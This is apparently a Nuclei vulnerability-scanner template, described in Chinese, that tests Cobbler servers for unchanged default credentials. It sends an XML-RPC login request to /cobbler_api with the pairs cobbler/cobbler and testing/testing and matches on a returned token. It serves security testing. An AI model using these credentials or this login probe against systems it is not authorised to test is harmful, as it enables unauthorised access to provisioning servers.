id: cobbler-default-login

info:
  name: Cobbler 默认口令登录（弱口令）
  author: c-sh0
  severity: high
  description: 该模板通过尝试 Cobbler 的默认账号口令（如 testing/testing），并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://seclists.org/oss-sec/2022/q1/146
    - https://github.com/cobbler/cobbler/issues/2307
    - https://github.com/cobbler/cobbler/issues/2909
  classification:
    cwe-id: CWE-798
  metadata:
    max-request: 2
  tags: cobbler,default-login,api,seclists,vuln

http:
  - raw:
      - |
        POST {{BaseURL}}/cobbler_api HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

        <?xml version='1.0'?>
        <methodCall>
          <methodName>login</methodName>
          <params>
            <param>
              <value>
                <string>{{username}}</string>
              </value>
            </param>
            <param>
              <value>
                <string>{{password}}</string>
              </value>
            </param>
          </params>
        </methodCall>

    attack: pitchfork
    payloads:
      username:
        - cobbler
        - testing
      password:
        - cobbler
        - testing

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - 'text/xml'

      - type: dsl
        dsl:
          - "!contains(tolower(body), '<name>faultCode</name>')"
          - "!contains(tolower(body), 'login failed')"
        condition: or

      - type: regex
        part: body
        regex:
          - "(.*[a-zA-Z0-9].+==)</string></value>"
